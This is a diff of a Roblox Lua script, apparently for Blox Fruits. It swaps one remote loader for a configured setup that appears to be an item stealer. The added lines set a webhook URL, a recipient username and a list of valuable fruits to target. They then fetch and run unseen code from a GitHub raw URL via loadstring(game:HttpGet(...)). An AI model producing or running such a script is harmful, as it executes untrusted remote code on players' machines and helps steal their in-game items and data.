@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/Script2/refs/heads/main/Source"))()
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=dzlDaWREM1NuMGljYVdvMlhOeTJrZzpzSjJYX255X2pXQWZ4eFhSUHl3dGg1cEhqMFJkWHN6WlAwbzBwSGFKSC16Wkd6Y0RZN2dWbXRfaVlacGlGMlFNWUFVQ3I3ZjRCZnFqOTdxd1hsaWVXX2ZFOXFSNHlDeTluN0pqaTFMdGZoYV85Znc4VF8xUFgxR0FDNkdCNE90OEhwbFlhMkNLWHNCVC1SVXBVQ282bTVDem05SUpqcnBIR1NIVWhnZFBqMDQ"
+Usernames = {"adam345341"}
+FruitsToHit = {"Portal-Portal", "Dough-Dough", "Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
